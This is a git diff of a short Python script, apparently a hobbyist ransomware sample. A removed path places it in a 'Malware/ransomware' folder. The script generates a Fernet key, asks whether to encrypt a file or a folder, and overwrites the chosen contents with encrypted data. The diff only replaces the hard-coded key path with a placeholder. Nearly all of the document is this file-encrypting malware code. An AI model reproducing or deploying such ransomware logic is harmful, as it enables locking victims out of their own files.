@@ -8,7 +8,7 @@ files = []
 
 key = Fernet.generate_key()
 
-with open('/home/homelab/Tools/Malware/ransomware/key/thekey.key', 'wb') as thekey:
+with open('yourdir/thekey.key', 'wb') as thekey:
     thekey.write(key)
 
 type = input('Encrypt folder/dir or file?: ')
@@ -23,7 +23,7 @@ if type.lower() == 'file':
             thefile.write(content_encryted)
     else:
         print('Wrong path')
-        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+        os.remove('yourdir/thekey.key')
 
 
 elif type.lower() == 'folder' or type.lower() == 'dir':
@@ -44,9 +44,9 @@ elif type.lower() == 'folder' or type.lower() == 'dir':
                     thefile.write(contents_encryted)
     else:
         print('Wrong path')
-        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+        os.remove('yourdir/thekey.key')
 
 else:
-    os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+    os.remove('yourdir/thekey.key')
     print("We can't handle your situation please try again")
     quit()
